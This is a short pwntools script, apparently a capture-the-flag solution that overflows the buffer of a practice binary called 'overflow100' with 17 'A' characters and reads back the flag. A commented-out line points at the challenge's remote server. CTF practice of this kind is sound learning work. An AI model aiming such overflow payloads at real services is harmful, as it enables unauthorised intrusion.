#python -c "print('A'*17)" | ./source/overflow100
from pwn import *

#r = remote("overflow100.heltsikker.no", 9020)
r = process("./source/overflow100")

exploit = 'A'*17

r.sendline(exploit)
r.recvuntil('flag!\n')
print(r.recvline())
